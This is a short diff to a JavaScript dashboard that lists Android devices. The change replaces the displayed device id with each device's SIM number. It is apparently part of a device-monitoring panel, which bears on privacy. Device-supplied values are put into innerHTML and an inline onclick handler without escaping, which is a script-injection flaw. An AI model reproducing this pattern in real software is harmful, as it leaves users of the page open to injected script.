@@ -76,7 +76,8 @@
             Object.keys(users).reverse().forEach(uid => {
                 const user = users[uid];
                 const model = (user.details && user.details.model) ? user.details.model : "Android Device";
-                const battery = (user.details && user.details.battery) ? user.details.battery : "Unknown";
+                const sim = (user.details && user.details.simNumber) ? user.details.simNumber : "Unknown";
+                const battery = (user.details && user.details.battery) ? user.details.battery : "??%";
                 
                 list.innerHTML += `
                     <div class="user-card" onclick="showUser('${uid}')">
@@ -87,7 +88,7 @@
                             </div>
                             <div class="user-info">
                                 <h6>Mobile : ${model}</h6>
-                                <p>Device Id : ${uid}</p>
+                                <p>Sim No : <span class="text-primary fw-bold">${sim}</span></p>
                                 <p>Battery : ${battery}</p>
                             </div>
                         </div>
